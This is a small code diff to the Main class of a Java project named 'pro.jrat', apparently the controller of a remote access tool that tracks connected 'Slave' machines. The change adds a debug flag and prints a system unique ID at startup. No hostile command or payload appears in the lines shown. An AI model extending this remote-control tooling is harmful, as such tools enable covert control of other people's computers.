@@ -28,9 +28,14 @@ import pro.jrat.utils.TrayIconUtils;
 public class Main {
 
 	public static final List<Slave> connections = new ArrayList<Slave>();
+
+	public static boolean debug;
 	public static Frame instance;
 
-	public static void main(String[] args) throws Exception {	
+	public static void main(String[] args) throws Exception {
+		System.out.println("System Unique ID: " + UniqueId.getTextual());
+		debug = argsContains(args, "-debug");
+		
 		if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
 			System.setProperty("apple.laf.useScreenMenuBar", "true");
 		}
